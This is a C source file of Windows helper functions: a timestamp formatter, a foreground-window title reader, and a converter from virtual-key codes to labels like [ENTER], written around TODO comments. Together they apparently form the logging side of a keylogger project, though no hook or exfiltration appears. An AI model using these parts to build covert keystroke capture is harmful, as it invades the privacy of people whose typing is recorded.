// util.c
#include "util.h"
#include <windows.h>

void util_get_timestamp(wchar_t *buf, int bufSize) {
    // TODO: use GetLocalTime + swprintf
    SYSTEMTIME st;
    GetLocalTime(&st);
    swprintf(buf, bufSize, L"%04d-%02d-%02d %02d:%02d:%02d",
             st.wYear, st.wMonth, st.wDay,
             st.wHour, st.wMinute, st.wSecond);
}

void util_get_active_window_title(wchar_t *buf, int bufSize) {
    // TODO:
    // - hwnd = GetForegroundWindow()
    // - GetWindowTextW(hwnd, buf, bufSize)
    HWND hwnd = GetForegroundWindow();
    GetWindowTextW(hwnd, buf, bufSize);
}

void util_vkey_to_string(DWORD vkCode, wchar_t *buf, int bufSize) {
    // TODO: 
    // - Handle letters (A-Z)
    // - Handle digits
    // - Handle special keys (ENTER, SPACE, SHIFT, BACKSPACE)
    // - Optionally use MapVirtualKey() or ToUnicodeEx()
    if (vkCode >= 'A' && vkCode <= 'Z') {
        swprintf(buf, bufSize, L"%c", (wchar_t)vkCode);
    } else if (vkCode >= '0' && vkCode <= '9') {
        swprintf(buf, bufSize, L"%c", (wchar_t)vkCode);
    } else {
        switch (vkCode) {
            case VK_RETURN:
                swprintf(buf, bufSize, L"[ENTER]");
                break;
            case VK_SPACE:
                swprintf(buf, bufSize, L"[SPACE]");
                break;
            case VK_SHIFT:
                swprintf(buf, bufSize, L"[SHIFT]");
                break;
            case VK_BACK:
                swprintf(buf, bufSize, L"[BACKSPACE]");
                break;
            default:
                swprintf(buf, bufSize, L"[0x%02X]", vkCode);
                break;
        }
    }
}
